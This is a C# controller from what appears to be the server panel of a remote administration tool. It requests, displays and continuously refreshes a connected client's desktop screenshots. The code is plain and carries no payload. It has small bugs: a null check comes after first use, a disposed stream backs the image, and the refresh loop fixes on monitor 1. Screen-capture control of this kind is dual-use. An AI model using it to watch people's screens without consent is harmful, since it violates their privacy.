using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;
using Serveur.Packets.ServerPackets;
using System.Drawing;
using System.IO;

namespace Serveur.Controllers
{
    class FrmRemoteDesktopController
    {

        public FrmRemoteDesktopController(ClientMosaic client)
        {
        }

        public static void getMonitorsResponse(ClientMosaic client, GetMonitorsResponse packet)
        {
            int number = packet.number;

            if (client.value == null || client.value.frmRdp == null)
            {
                return;
            }

            client.value.frmRdp.cleanComboBox();

            client.value.frmRdp.addScreens(number);
        }

        public static void getDesktop(ClientMosaic client, int monitor)
        {
            new GetDesktop(85, monitor).Execute(client);
        }

        public static void getDesktopResponse(ClientMosaic client, GetDesktopResponse packet)
        {
            Image desktop; 

            using (MemoryStream ms = new MemoryStream(packet.image))
            {                
                desktop = Image.FromStream(ms);                
            }

            client.value.frmRdp.updateRdp(desktop);

            packet.image = null;

            if(client.value != null && client.value.frmRdp != null && client.value.frmRdp.stopRdp != true)
            {
                new GetDesktop(85, 1).Execute(client);
            }
        }
    }
}
